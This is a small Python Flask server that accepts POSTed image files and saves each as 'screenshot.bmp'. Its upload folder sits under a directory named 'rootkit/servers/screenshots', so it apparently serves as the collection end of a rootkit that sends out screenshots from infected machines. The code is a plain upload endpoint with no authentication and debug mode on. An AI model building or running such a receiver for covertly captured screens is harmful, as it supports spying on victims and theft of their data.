from flask import Flask, request
from flask_restful import Resource, Api, reqparse
import base64
import os

app = Flask(__name__)
api = Api(app)

app.config['UPLOAD_FOLDER'] = '/home/mislav/Desktop/rootkit/servers/screenshots/files'

screen_args = reqparse.RequestParser()
screen_args.add_argument("image")

class FetchScreenshot(Resource):
    def post(self):
        file = request.files["image"]
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], 'screenshot.bmp'))
        return "received"

api.add_resource(FetchScreenshot, '/')

if __name__ == "__main__":
    app.run(debug=True)